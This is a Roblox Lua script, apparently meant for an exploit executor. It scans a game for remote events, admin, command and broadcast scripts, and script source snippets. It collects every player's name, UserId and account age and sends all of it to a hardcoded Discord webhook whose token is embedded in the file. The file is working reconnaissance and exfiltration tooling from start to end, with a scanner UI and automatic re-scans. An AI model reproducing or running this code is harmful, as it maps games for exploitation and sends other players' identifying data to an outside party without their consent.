local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1406970787478634610/2-a_1e8XweoASfU6EdE6mDSbSCIXPjHWJ5PRikjO6JkRjMxRb4m5SIRTuo3HtAiPorYA"

local EMBED_COLOR_DEFAULT = 5793266
local MAX_EMBED_DESC = 3500
local CHUNK_POST_DELAY = 0.8

local request = request or http_request or (syn and syn.request)

----------------------------------------------------
-- Global message name patterns
----------------------------------------------------
local GLOBAL_MESSAGE_PATTERNS = {
	"globalmessage","broadcast","announce","notification","alert","systemmessage","global_msg","global"
}

local function isGlobalMessageName(name)
	if not name then return false end
	local lower = tostring(name):lower()
	for _,pat in ipairs(GLOBAL_MESSAGE_PATTERNS) do
		if lower:find(pat) then return true end
	end
	return false
end

----------------------------------------------------
-- Helpers: snippets, safe children, map id heuristics
----------------------------------------------------
local function getSnippet(scriptObj)
	if not scriptObj then return nil end
	local ok, src = pcall(function() return scriptObj.Source end)
	if ok and src and #src > 0 then
		local s = src:sub(1,200):gsub("\r",""):gsub("\n"," ")
		return s
	end
	return nil
end

local function safeDescendants(container)
	local out = {}
	pcall(function()
		for _,v in ipairs(container:GetDescendants()) do
			table.insert(out, v)
		end
	end)
	return out
end

local function codeBlock(txt)
	return "```" .. tostring(txt) .. "```"
end

local function detectMapAssetId()
	local candidate = workspace:FindFirstChild("Map") or workspace:FindFirstChild("map")
	if candidate then
		local attr = candidate:GetAttribute("MapAssetId") or candidate:GetAttribute("AssetId") or candidate:GetAttribute("MapId")
		if attr then return tostring(attr) end
		for _,desc in ipairs(candidate:GetDescendants()) do
			if desc:IsA("MeshPart") and desc.MeshId and desc.MeshId ~= "" then
				return tostring(desc.MeshId)
			elseif desc:IsA("SpecialMesh") and desc.MeshId and desc.MeshId ~= "" then
				return tostring(desc.MeshId)
			elseif desc:IsA("Decal") and desc.Texture and desc.Texture ~= "" then
				return tostring(desc.Texture)
			elseif desc:IsA("Texture") and desc.Texture then
				return tostring(desc.Texture)
			end
		end
	end

	for _,desc in ipairs(workspace:GetDescendants()) do
		if desc:IsA("MeshPart") and desc.MeshId and desc.MeshId ~= "" then
			return tostring(desc.MeshId)
		elseif desc:IsA("SpecialMesh") and desc.MeshId and desc.MeshId ~= "" then
			return tostring(desc.MeshId)
		end
	end

	local wattr = workspace:GetAttribute("MapAssetId") or workspace:GetAttribute("MapId") or workspace:GetAttribute("AssetId")
	if wattr then return tostring(wattr) end

	return string.format("PlaceId:%d GameId:%s", game.PlaceId, tostring(game.GameId))
end

----------------------------------------------------
-- Collect players info
----------------------------------------------------
local function collectPlayersInfo()
	local t = {}
	for _,plr in ipairs(Players:GetPlayers()) do
		local info = {}
		info.Name = plr.Name
		info.DisplayName = plr.DisplayName or ""
		info.UserId = plr.UserId
		local ok, age = pcall(function() return plr.AccountAge end)
		if ok then info.AccountAge = age end
		info.HasBackpack = plr:FindFirstChild("Backpack") ~= nil
		info.HasPlayerGui = plr:FindFirstChild("PlayerGui") ~= nil
		info.HasPlayerScripts = plr:FindFirstChild("PlayerScripts") ~= nil
		table.insert(t, info)
	end
	return t
end

----------------------------------------------------
-- Main scanning logic (remotes, cmds, global messages, snippets)
----------------------------------------------------
local SCAN_CLASSES = { RemoteEvent = true, RemoteFunction = true }

local SCAN_CONTAINERS = {
	workspace,
	ReplicatedStorage,
	StarterGui,
	StarterPack,
	StarterPlayer,
	Lighting
}

local function collectTargets()
	local lines = {} -- all lines for detail txt
	local counts = { RemoteEvent = 0, RemoteFunction = 0, CmdScripts = 0, GlobalMsg = 0, total = 0 }
	local remotes = {}
	local cmdScripts = {}
	local globalMessages = {}
	local snippets = {}

	local function processInstance(inst)
		if SCAN_CLASSES[inst.ClassName] then
			local line = string.format("[%s] %s (Parent=%s)", inst.ClassName, inst:GetFullName(), tostring(inst.Parent and inst.Parent:GetFullName() or "nil"))
			table.insert(lines, line)
			table.insert(remotes, {class = inst.ClassName, full = inst:GetFullName(), parent = tostring(inst.Parent and inst.Parent:GetFullName() or "nil")})
			if isGlobalMessageName(inst.Name) then
				table.insert(lines, "[GlobalMessage] " .. inst:GetFullName())
				table.insert(globalMessages, {type = "Remote", full = inst:GetFullName(), name = inst.Name})
				counts.GlobalMsg = counts.GlobalMsg + 1
			else
				counts[inst.ClassName] = counts[inst.ClassName] + 1
			end
			counts.total = counts.total + 1
		end

		if inst:IsA("Script") or inst:IsA("LocalScript") or inst:IsA("ModuleScript") then
			local lname = tostring(inst.Name):lower()
			if lname:find("cmd") or lname:find("command") or lname:find("admin") then
				local line = string.format("[CommandScript] %s (%s) Parent=%s", inst:GetFullName(), inst.ClassName, tostring(inst.Parent and inst.Parent:GetFullName() or "nil"))
				table.insert(lines, line)
				table.insert(cmdScripts, {full = inst:GetFullName(), class = inst.ClassName})
				counts.CmdScripts = counts.CmdScripts + 1
				counts.total = counts.total + 1
			elseif isGlobalMessageName(lname) then
				local line = string.format("[GlobalMessageScript] %s (%s) Parent=%s", inst:GetFullName(), inst.ClassName, tostring(inst.Parent and inst.Parent:GetFullName() or "nil"))
				table.insert(lines, line)
				table.insert(globalMessages, {type = "Script", full = inst:GetFullName(), class = inst.ClassName})
				counts.GlobalMsg = counts.GlobalMsg + 1
				counts.total = counts.total + 1
			end

			local s = getSnippet(inst)
			if s then
				snippets[inst:GetFullName()] = s
			end
		end
	end

	for _,container in ipairs(SCAN_CONTAINERS) do
		for _,inst in ipairs(safeDescendants(container)) do
			processInstance(inst)
		end
	end

	for _,plr in ipairs(Players:GetPlayers()) do
		for _,container in ipairs({ plr:FindFirstChild("Backpack"), plr:FindFirstChild("PlayerGui"), plr:FindFirstChild("PlayerScripts") }) do
			if container then
				for _,inst in ipairs(safeDescendants(container)) do
					processInstance(inst)
				end
			end
		end
	end

	table.sort(lines)
	return {
		lines = lines,
		counts = counts,
		remotes = remotes,
		cmdScripts = cmdScripts,
		globalMessages = globalMessages,
		snippets = snippets
	}
end

local function chunkLines(linesList, maxChars)
	local chunks, current = {}, ""
	for _, line in ipairs(linesList) do
		if #current + #line + 1 > maxChars then
			table.insert(chunks, current)
			current = line .. "\n"
		else
			current = current .. line .. "\n"
		end
	end
	if #current > 0 then table.insert(chunks, current) end
	return chunks
end

----------------------------------------------------
-- UI: Processing Screen + Progress + Rescan button
-- Textbox removed per request; setLog is a safe no-op to avoid breaking calls.
----------------------------------------------------
local function createProcessingUI()
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "ProcessingUI"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 420, 0, 180)
	frame.Position = UDim2.new(0.5, -210, 0.5, -90)
	frame.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui

	local uicorner = Instance.new("UICorner")
	uicorner.CornerRadius = UDim.new(0, 16)
	uicorner.Parent = frame

	local uistroke = Instance.new("UIStroke")
	uistroke.Thickness = 3
	uistroke.Color = Color3.fromRGB(0, 150, 255)
	uistroke.Parent = frame

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -20, 0, 36)
	title.Position = UDim2.new(0, 10, 0, 6)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.GothamBold
	title.TextColor3 = Color3.fromRGB(0,200,255)
	title.TextScaled = true
	title.Text = "🔍 Deep Scanner"
	title.Parent = frame

	-- progress background
	local pbg = Instance.new("Frame", frame)
	pbg.Size = UDim2.new(1, -20, 0, 18)
	pbg.Position = UDim2.new(0, 10, 0, 50)
	pbg.BackgroundColor3 = Color3.fromRGB(25,25,35)
	Instance.new("UICorner", pbg).CornerRadius = UDim.new(0,8)

	local progress = Instance.new("Frame", pbg)
	progress.Size = UDim2.new(0, 0, 1, 0)
	progress.BackgroundColor3 = Color3.fromRGB(0,200,255)
	Instance.new("UICorner", progress).CornerRadius = UDim.new(0,8)

	-- progress text
	local ptxt = Instance.new("TextLabel", frame)
	ptxt.Size = UDim2.new(1, -20, 0, 20)
	ptxt.Position = UDim2.new(0, 10, 0, 72)
	ptxt.BackgroundTransparency = 1
	ptxt.Font = Enum.Font.Gotham
	ptxt.TextColor3 = Color3.fromRGB(180,180,200)
	ptxt.TextScaled = true
	ptxt.Text = "Ready"

	-- rescan button
	local button = Instance.new("TextButton", frame)
	button.Size = UDim2.new(0.32, 0, 0, 30)
	button.Position = UDim2.new(0.34, 0, 1, -36)
	button.Text = "Rescan Now"
	button.Font = Enum.Font.GothamBold
	button.TextScaled = true
	button.TextColor3 = Color3.new(1,1,1)
	button.BackgroundColor3 = Color3.fromRGB(0,150,255)
	Instance.new("UICorner", button).CornerRadius = UDim.new(0,8)

	-- floating animation subtle
	task.spawn(function()
		while screenGui.Parent do
			pcall(function()
				frame.Position = frame.Position + UDim2.new(0,0,0,-3)
				task.wait(0.45)
				frame.Position = frame.Position + UDim2.new(0,0,0,3)
				task.wait(0.45)
			end)
		end
	end)

	-- helper to update progress percent (safe)
	local function setProgress(curr, total)
		local pct = 0
		if total and total > 0 then pct = math.clamp(curr/total, 0, 1) end
		progress:TweenSize(UDim2.new(pct, 0, 1, 0), "Out", "Sine", 0.2, true)
		ptxt.Text = string.format("Scanning: %d / %d (%.0f%%)", curr, total, pct*100)
	end

	-- safe no-op for log (textbox removed)
	local function setLog(txt)
		-- no-op: UI log textbox removed intentionally
	end

	return {
		gui = screenGui,
		progressSetter = setProgress,
		setLog = setLog,
		rescanButton = button,
		destroy = function() pcall(function() screenGui:Destroy() end) end
	}
end

----------------------------------------------------
-- Webhook send helper (multipart with embed + file)
----------------------------------------------------
local function nowISO8601()
	return os.date("!%Y-%m-%dT%H:%M:%SZ")
end

local function makeEmbed(title, description, fields, color, thumbnailUrl, footerText)
	local e = {
		title = title,
		description = description,
		color = color or EMBED_COLOR_DEFAULT,
		fields = fields or {},
		timestamp = nowISO8601()
	}
	if thumbnailUrl then e.thumbnail = { url = thumbnailUrl } end
	if footerText then e.footer = { text = footerText } end
	return e
end

local function postWebhookMultipart(embedTable, fileName, fileContent)
	local boundary = "----BOUNDARY"..HttpService:GenerateGUID(false)
	local bodyParts = {}

	local payload = { embeds = embedTable }
	table.insert(bodyParts, "--" .. boundary)
	table.insert(bodyParts, 'Content-Disposition: form-data; name="payload_json"')
	table.insert(bodyParts, "")
	table.insert(bodyParts, HttpService:JSONEncode(payload))

	if fileContent then
		table.insert(bodyParts, "--" .. boundary)
		table.insert(bodyParts, 'Content-Disposition: form-data; name="file"; filename="' .. (fileName or "scan_results.txt") .. '"')
		table.insert(bodyParts, "Content-Type: text/plain")
		table.insert(bodyParts, "")
		table.insert(bodyParts, fileContent)
	end

	table.insert(bodyParts, "--" .. boundary .. "--")
	local body = table.concat(bodyParts, "\r\n")

	local ok, err = pcall(function()
		request({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
			Body = body
		})
	end)
	if not ok then
		warn("[Scanner] Webhook failed:", err)
	end
end

----------------------------------------------------
-- Orchestrator: run scan, prepare embeds, upload txt
----------------------------------------------------
local function performFullScan(ui)
	-- prepare progress details reading all relevant descendants counts
	local totalToScan = 0
	for _,c in ipairs(SCAN_CONTAINERS) do totalToScan = totalToScan + #safeDescendants(c) end
	-- include players containers
	for _,plr in ipairs(Players:GetPlayers()) do
		local conts = {plr:FindFirstChild("Backpack"), plr:FindFirstChild("PlayerGui"), plr:FindFirstChild("PlayerScripts")}
		for _,ct in ipairs(conts) do if ct then totalToScan = totalToScan + #safeDescendants(ct) end end
	end
	if totalToScan == 0 then totalToScan = 1 end

	-- progress tracking variables for UI
	local scannedCount = 0
	if ui and ui.progressSetter then ui.progressSetter(0, totalToScan) end
	if ui and ui.setLog then ui.setLog("Scanning...") end

	-- collect everything using central collector (single pass)
	local targets = collectTargets()
	local lines = targets.lines
	local counts = targets.counts
	local remotes = targets.remotes
	local cmdScripts = targets.cmdScripts
	local globalMessages = targets.globalMessages
	local snippets = targets.snippets

	-- quick visual progress loop for UX
	for _,c in ipairs(SCAN_CONTAINERS) do
		for _,_ in ipairs(safeDescendants(c)) do
			scannedCount = scannedCount + 1
			if ui and ui.progressSetter then ui.progressSetter(scannedCount, totalToScan) end
			if ui and ui.setLog then ui.setLog(string.format("Remotes: %d  CmdScripts: %d  GlobalMsgs: %d", counts.RemoteEvent + counts.RemoteFunction, counts.CmdScripts, counts.GlobalMsg)) end
		end
	end

	if ui and ui.progressSetter then ui.progressSetter(totalToScan, totalToScan) end
	if ui and ui.setLog then ui.setLog("Preparing results...") end

	-- collect players info and map id
	local playersInfo = collectPlayersInfo()
	local mapAssetId = detectMapAssetId()

	-- prepare txt content (detailed)
	local txtLines = {}
	table.insert(txtLines, "=== Deep Scan Report ===")
	table.insert(txtLines, "Game: " .. tostring(game.Name) .. " (PlaceId:" .. tostring(game.PlaceId) .. ")")
	table.insert(txtLines, "GameId: " .. tostring(game.GameId))
	table.insert(txtLines, "MapAssetId (detected): " .. tostring(mapAssetId))
	table.insert(txtLines, "")
	table.insert(txtLines, "== Counts ==")
	for k,v in pairs(counts) do table.insert(txtLines, string.format("%s: %s", tostring(k), tostring(v))) end
	table.insert(txtLines, "")
	table.insert(txtLines, "== Players in Server ==")
	for _,p in ipairs(playersInfo) do
		table.insert(txtLines, string.format("%s [%s] (UserId:%d) AccountAge:%s Backpack:%s PlayerGui:%s PlayerScripts:%s",
			tostring(p.DisplayName or p.Name), tostring(p.Name), tonumber(p.UserId) or 0,
			tostring(p.AccountAge or "N/A"), tostring(p.HasBackpack), tostring(p.HasPlayerGui), tostring(p.HasPlayerScripts)))
	end
	table.insert(txtLines, "")
	table.insert(txtLines, "== Detected Items (all) ==")
	if #lines == 0 then
		table.insert(txtLines, "None")
	else
		for _,l in ipairs(lines) do table.insert(txtLines, l) end
	end

	local txtContent = table.concat(txtLines, "\n")

	-- create a single summary embed that contains counts and a "Detected Items" field (truncated if too long),
	-- and attach the full TXT as file for full details.
	local detectedConcat = table.concat(lines, "\n")
	-- discord field value limit ~1024; keep it safe (show preview in embed, full in attached txt)
	local detectedPreview = detectedConcat:sub(1, 1000)
	if #detectedConcat > 1000 then detectedPreview = detectedPreview .. "\n...(truncated, full details attached)" end

	local fields = {
		{name = "Remotes", value = tostring(#remotes), inline = true},
		{name = "CmdScripts", value = tostring(#cmdScripts), inline = true},
		{name = "GlobalMessages", value = tostring(#globalMessages), inline = true},
		{name = "PlayersInServer", value = tostring(#playersInfo), inline = true},
		{name = "MapAssetId", value = tostring(mapAssetId), inline = false},
		{name = "Detected Items (preview)", value = detectedPreview, inline = false}
	}

	local thumbUrl = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", game.PlaceId)
	local gameInfoOk, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
	local gameName = game.Name
	if gameInfoOk and gameInfo and gameInfo.Name then
		gameName = gameInfo.Name
	end

	local embed = makeEmbed(gameName .. " – Deep Scan Summary", "Full container scan complete.", fields, EMBED_COLOR_DEFAULT, thumbUrl, "PlaceId:" .. tostring(game.PlaceId) .. " | GameId:" .. tostring(game.GameId))

	-- post summary + full txt attachment
	postWebhookMultipart({embed}, "scan_results_"..tostring(game.PlaceId)..".txt", txtContent)

	-- details in chunks if many lines (only if needed for extra visibility) - these are separate detail embeds
	if #lines > 0 then
		local chunks = chunkLines(lines, MAX_EMBED_DESC - 10)
		for i,chunk in ipairs(chunks) do
			local title = string.format("%s – Details (Part %d/%d)", gameName, i, #chunks)
			postWebhookMultipart({ makeEmbed(title, codeBlock(chunk), nil, EMBED_COLOR_DEFAULT, thumbUrl) }, nil, nil)
			if i < #chunks then task.wait(CHUNK_POST_DELAY) end
		end
	end

	-- send each remote as an individual embed (split per detected part)
	for _,r in ipairs(remotes) do
		local desc = string.format("Class: %s\nFull: %s\nParent: %s", tostring(r.class), tostring(r.full), tostring(r.parent))
		postWebhookMultipart({ makeEmbed("Remote Found", desc, nil, EMBED_COLOR_DEFAULT, thumbUrl) }, nil, nil)
		task.wait(CHUNK_POST_DELAY)
	end

	-- send each command script individually
	for _,c in ipairs(cmdScripts) do
		local desc = string.format("Script: %s\nType: %s", tostring(c.full), tostring(c.class))
		postWebhookMultipart({ makeEmbed("Command Script Found", desc, nil, EMBED_COLOR_DEFAULT, thumbUrl) }, nil, nil)
		task.wait(CHUNK_POST_DELAY)
	end

	-- send each global message individually
	for _,g in ipairs(globalMessages) do
		local desc = string.format("Full: %s\nType: %s", tostring(g.full), tostring(g.type or "Remote"))
		if g.name then desc = desc .. ("\nName: %s"):format(tostring(g.name)) end
		postWebhookMultipart({ makeEmbed("Global Message Found", desc, nil, EMBED_COLOR_DEFAULT, thumbUrl) }, nil, nil)
		task.wait(CHUNK_POST_DELAY)
	end

	-- send snippets individually (show snippet preview)
	for full, snip in pairs(snippets) do
		local desc = string.format("%s\n\nSnippet Preview: %s", tostring(full), tostring(snip):sub(1,1000))
		postWebhookMultipart({ makeEmbed("Snippet", desc, nil, EMBED_COLOR_DEFAULT, thumbUrl) }, nil, nil)
		task.wait(CHUNK_POST_DELAY)
	end

	if ui and ui.setLog then ui.setLog(string.format("Scan complete. Remotes: %d | Cmds: %d | GlobalMsgs: %d", #remotes, #cmdScripts, #globalMessages)) end

	return {
		lines = lines,
		counts = counts,
		remotes = remotes,
		cmdScripts = cmdScripts,
		globalMessages = globalMessages,
		snippets = snippets,
		txt = txtContent,
		mapAssetId = mapAssetId,
		playersInfo = playersInfo
	}
end

----------------------------------------------------
-- Setup UI, rescan button and live monitoring
----------------------------------------------------
local function setupScanner()
	local ui = createProcessingUI()

	-- initial scan
	task.spawn(function()
		local res = performFullScan(ui)
	end)

	-- manual rescan
	ui.rescanButton.MouseButton1Click:Connect(function()
		ui.progressSetter(0,1)
		ui.setLog("Manual rescan started...")
		task.spawn(function()
			local r = performFullScan(ui)
		end)
	end)

	-- live monitoring: when new descendant is added to workspace or ReplicatedStorage, do light check and optionally full rescan if relevant
	local monitoredContainers = { workspace, game:GetService("ReplicatedStorage") }
	for _,c in ipairs(monitoredContainers) do
		c.DescendantAdded:Connect(function(inst)
			local name = tostring(inst.Name or "")
			if isGlobalMessageName(name) or SCAN_CLASSES[inst.ClassName] then
				task.spawn(function()
					performFullScan(ui)
				end)
			end
		end)
	end

	return ui
end

-- run
local ui = setupScanner()
